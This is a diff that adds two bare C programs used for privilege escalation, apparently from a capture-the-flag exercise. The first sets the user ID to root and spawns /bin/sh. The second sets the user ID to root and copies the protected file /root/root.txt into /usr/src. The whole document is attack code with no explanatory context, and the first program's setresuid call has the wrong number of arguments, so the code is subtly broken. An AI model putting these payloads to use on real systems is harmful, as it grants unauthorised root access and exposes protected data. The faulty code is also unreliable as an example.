@@ -1,0 +1,23 @@
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <unistd.h> 
+int main( int argc, char *argv[] ) 
+{ 
+setresuid(0, 0); 
+printf("ID: %d\n", geteuid()); 
+execve("/bin/sh", NULL, NULL); 
+}
+
+----
+
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <unistd.h> 
+#include <sys/types.h> 
+
+int main() 
+{ 
+	setuid(0); 
+	system("cat /root/root.txt > /usr/src/a.txt");
+	return 0;
+}
